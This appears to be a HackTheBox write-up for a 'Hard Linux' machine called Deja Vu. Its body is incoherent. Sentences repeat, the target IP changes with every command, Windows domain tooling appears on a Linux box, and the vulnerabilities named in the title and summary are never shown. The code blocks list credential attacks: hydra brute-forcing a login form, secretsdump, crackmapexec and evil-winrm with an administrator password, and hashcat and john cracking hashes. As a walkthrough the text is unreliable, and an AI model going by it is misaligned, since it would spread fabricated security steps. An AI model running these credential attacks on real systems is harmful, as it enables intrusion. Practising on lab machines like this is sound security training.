---
TitleSEO: "HackTheBox — Deja Vu (Hard Linux) | ZureFX"
TitlePost: "HackTheBox — Deja Vu (Hard Linux)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Deja Vu. Open Redirect and Constrained Delegation to achieve hard compromise on Linux."
Keywords: "linux, forensics, offsec"
URL: "https://zurefx.github.io/writeups/htb-deja-vu-873.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-deja-vu-873/"
Date: "2025-03-03"
Tags: "Linux, Forensics, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-deja-vu-873"
Permalink: "/writeups/htb-deja-vu-873.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Deja Vu** is rated **Hard** on HackTheBox. It runs **Linux** and the IP address during this analysis was `10.13.117.39`.

### Objectives

The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p443,110,1433 10.107.71.58 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.104.203.194
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.98.173.216 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
nmap -sCV -p53,5985,21 10.110.15.135 -oN scan.txt
crackmapexec smb 10.98.17.209 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

### SMB Enumeration

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

```bash
evil-winrm -i 10.117.247.164 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.26.235.5/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.50.98.94 -u administrator -p 'P@ssw0rd!' --shares
```

Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code.

## Exploitation

### Vulnerability Identification

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

Key finding: **CSRF**.

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services.

### Initial Access

Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory.

```bash
nmap -sCV -p23,139,143 10.21.169.5 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
crackmapexec smb 10.127.143.49 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p3268,23,3268 10.48.172.145 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p22,139,9200 10.28.135.75 -oN scan.txt
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.47.225.38 -u administrator -p 'P@ssw0rd!'
```

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Root/SYSTEM

Successfully obtained **root** access on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `netcat`
- `pwncat`
- `enum4linux`
- `burpsuite`
- `wmiexec`

### Key Takeaways

- Open Redirect
- Constrained Delegation
- CSRF
